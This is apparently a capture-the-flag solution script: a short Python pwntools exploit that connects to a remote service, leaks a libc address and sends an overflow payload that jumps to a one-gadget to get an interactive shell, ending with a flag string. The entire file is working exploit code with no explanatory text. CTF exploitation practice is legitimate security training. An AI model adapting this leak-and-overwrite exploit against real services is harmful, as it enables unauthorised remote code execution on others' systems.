#!/usr/bin/env python


from pwn import *

r = remote('172.16.101.57',12035)

r.sendafter('? ','1111222233')
res = r.readuntil('\n')
res = res.split('1111222233')[1][2:-1] # leak address and calculate libc_base

magic = u32(res) - 0x1a73c4 + 0x3fbb7 # magic gadget
print 'magic :',hex(magic)

r.sendafter('? ','passbbbbccccddddeeeeffff'+p32(magic))
r.interactive()


# AD{0N3_5H07_0N3_K1Ll}
